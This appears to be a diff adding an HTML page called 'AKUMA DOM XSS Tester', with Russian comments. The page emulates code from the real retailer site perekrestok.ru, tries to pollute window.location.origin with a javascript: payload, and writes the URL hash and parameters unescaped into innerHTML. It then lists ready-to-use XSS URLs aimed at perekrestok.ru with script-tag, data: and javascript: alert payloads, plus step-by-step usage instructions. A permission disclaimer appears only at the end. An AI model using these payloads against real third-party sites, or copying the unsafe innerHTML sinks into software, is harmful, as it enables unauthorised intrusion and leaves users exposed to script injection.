@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>AKUMA DOM XSS Test</title>
+</head>
+<body>
+    <h1>🔥 AKUMA DOM XSS Tester 🔥</h1>
+    <div id="results"></div>
+
+    <script>
+        // Тест 1: Прямая манипуляция origin
+        console.log("🔍 Тест 1: Манипуляция window.location.origin");
+        
+        try {
+            // Попытка переопределить origin (как в коде Perekrestok)
+            Object.defineProperty(window.location, 'origin', {
+                value: 'javascript:alert("AKUMA_DOM_XSS")//',
+                writable: true,
+                configurable: true
+            });
+            
+            // Эмуляция кода с Perekrestok
+            const origin = window.location.protocol + "//" + window.location.host;
+            document.getElementById('ORIGIN-ID').innerHTML = "Origin: " + origin;
+            
+            console.log("✅ Origin pollution test passed");
+        } catch (e) {
+            console.log("❌ Origin pollution failed:", e);
+        }
+
+        // Тест 2: Hash-based XSS
+        console.log("🔍 Тест 2: Hash-based DOM XSS");
+        
+        if (location.hash) {
+            const hashValue = decodeURIComponent(location.hash.substring(1));
+            console.log("Hash value:", hashValue);
+            
+            // Опасная практика - прямое использование hash в innerHTML
+            if (hashValue.includes('<script>') || hashValue.includes('javascript:')) {
+                console.log("🚨 ПОТЕНЦИАЛЬНЫЙ DOM XSS НАЙДЕН!");
+                document.getElementById('results').innerHTML = 
+                    '<div style="color: red; font-weight: bold;">⚠️ DOM XSS VECTOR DETECTED: ' + hashValue + '</div>';
+            }
+        }
+
+        // Тест 3: URL параметры
+        console.log("🔍 Тест 3: URL параметры DOM XSS");
+        
+        const urlParams = new URLSearchParams(window.location.search);
+        for (const [key, value] of urlParams) {
+            console.log(`Param ${key}: ${value}`);
+            
+            if (value.includes('<') || value.includes('javascript:') || value.includes('data:')) {
+                console.log("🚨 ПОТЕНЦИАЛЬНАЯ УЯЗВИМОСТЬ В ПАРАМЕТРЕ:", key, "=", value);
+                document.getElementById('results').innerHTML += 
+                    '<div style="color: orange;">⚠️ Suspicious param: ' + key + ' = ' + value + '</div>';
+            }
+        }
+
+        // Результаты
+        document.getElementById('results').innerHTML += 
+            '<div style="margin-top: 20px; padding: 10px; border: 2px solid #ccc;">' +
+            '<h3>🔍 Тестовые URL для Perekrestok:</h3>' +
+            '<p><strong>1. Hash-based:</strong><br>' +
+            '<code>https://www.perekrestok.ru/status#&lt;script&gt;alert("AKUMA")&lt;/script&gt;</code></p>' +
+            
+            '<p><strong>2. Data URL:</strong><br>' +
+            '<code>https://www.perekrestok.ru/status#data:text/html,&lt;script&gt;alert("AKUMA")&lt;/script&gt;</code></p>' +
+            
+            '<p><strong>3. Javascript URL:</strong><br>' +
+            '<code>https://www.perekrestok.ru/status#javascript:alert("AKUMA")</code></p>' +
+            
+            '<h3>🎯 Как использовать:</h3>' +
+            '<ol>' +
+            '<li>Открой любой из URL выше в браузере</li>' +
+            '<li>Открой Developer Tools (F12)</li>' +
+            '<li>Смотри на консоль и DOM</li>' +
+            '<li>Если видишь alert или код выполнился - BINGO!</li>' +
+            '</ol>' +
+            
+            '<p style="color: red; font-weight: bold;">⚠️ ВАЖНО: Тестируй только на своих сайтах или с разрешением!</p>' +
+            '</div>';
+
+        console.log("🏁 Тесты завершены. Проверь результаты выше!");
+    </script>
+
+    <div id="ORIGIN-ID" style="margin-top: 20px; padding: 10px; background: #f0f0f0;">
+        <!-- Сюда будет записан origin (как на Perekrestok) -->
+    </div>
+</body>
+</html>
